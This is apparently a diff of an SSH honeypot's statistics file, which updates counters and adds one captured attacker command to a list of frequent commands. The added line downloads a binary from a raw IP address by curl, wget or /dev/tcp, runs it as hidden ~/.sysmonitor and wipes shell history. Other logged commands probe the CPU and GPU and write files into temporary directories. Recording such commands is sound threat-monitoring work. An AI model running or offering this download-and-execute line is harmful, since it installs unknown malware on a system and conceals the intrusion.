@@ -1,9 +1,9 @@
 {
-  "LastUpdated": "2026-10-17T07:12:43.6816296Z",
+  "LastUpdated": "2026-10-17T07:12:48.3430122Z",
   "TotalUniqueUsernames": 768,
   "TotalUniquePasswords": 1383,
   "TotalUniqueSourceIps": 1467,
-  "TotalUniqueCommands": 184,
+  "TotalUniqueCommands": 185,
   "Usernames": {
     "root": 5030,
     "admin": 1594,
@@ -3626,7 +3626,7 @@
     "202.86.149.20": 5,
     "27.79.3.14": 30,
     "106.219.147.252": 4,
-    "77.239.124.79": 38
+    "77.239.124.79": 42
   },
   "FrequentCommands": {
     "id": 26,
@@ -3812,6 +3812,7 @@
     "LC_ALL=C lscpu | awk -F: \u0027/Model name/ {gsub(/^[ \\t]\u002B/, \u0022\u0022, $2); print $2; exit}\u0027": 1,
     "nvidia-smi -q | grep \u0022Product Name\u0022 | head -n 1 | awk \u0027{print $4, $5, $6, $7, $8, $9}\u0027 || echo \u0027No\u0027": 1,
     "nvidia-smi -q | grep \u0022Attached GPUs\u0022 | awk \u0027{print $4}\u0027 \u0026\u0026 echo \u0027\u0027 || echo \u0027No\u0027": 1,
-    "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027ZmE=\u0027 | base64 -d \u003E \u0022$d/.wall_07861205\u0022; done": 1
+    "for d in /dev/shm /var/tmp /tmp; do printf \u0027%s\u0027 \u0027ZmE=\u0027 | base64 -d \u003E \u0022$d/.wall_07861205\u0022; done": 1,
+    "curl -sSL http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG -o ~/.sysmonitor 2\u003E/dev/null || wget -qO ~/.sysmonitor http://103.160.59.94:28816/CZRmrtxnrNONBXhwfFeqjNfBrliNaShG 2\u003E/dev/null || { exec 3\u003C\u003E/dev/tcp/103.160.59.94/28816 \u0026\u0026 echo -e \u0022GET /CZRmrtxnrNONBXhwfFeqjNfBrliNaShG HTTP/1.1\\r\\nHost: 103.160.59.94\\r\\nConnection: close\\r\\n\\r\\n\u0022 \u003E\u00263 \u0026\u0026 cat \u003C\u00263 | sed \u00221,/^\\r$/d\u0022 \u003E ~/.sysmonitor; }; chmod \u002Bx ~/.sysmonitor \u0026\u0026 ~/.sysmonitor \u0026\u0026 history -c \u0026\u0026 history -w": 1
   }
 }
